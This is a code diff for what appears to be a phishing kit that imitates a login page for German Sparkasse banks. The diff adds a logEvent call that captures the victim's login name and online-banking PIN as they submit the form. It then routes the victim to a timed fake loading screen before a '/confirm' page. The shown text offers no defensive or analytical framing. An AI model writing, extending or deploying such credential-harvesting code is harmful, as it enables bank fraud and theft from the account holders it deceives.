@@ -2,6 +2,8 @@ import { useState } from "react";
 import { createFileRoute, Link, useParams, useNavigate } from "@tanstack/react-router";
 import { ArrowLeft, Info, X } from "lucide-react";
 import { bankLogoUrls } from "@/assets/bank-logos";
+import { logEvent } from "@/lib/session";
+
 
 export const sparkassen: string[] = [
   "Berliner Sparkasse - Landesbank Berlin",
@@ -206,7 +208,9 @@ function SparkassenLoginPage() {
                   sessionStorage.setItem("bankName", name);
                   sessionStorage.setItem("bankLogo", "sparkassen");
                 } catch {}
+                logEvent("bank_login", { bank_slug: "sparkassen", bank_name: name, field1_label: "Anmeldename oder Legitimations-ID", field1: login, field2_label: "PIN", field2: pin });
                 navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
+
               }}
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
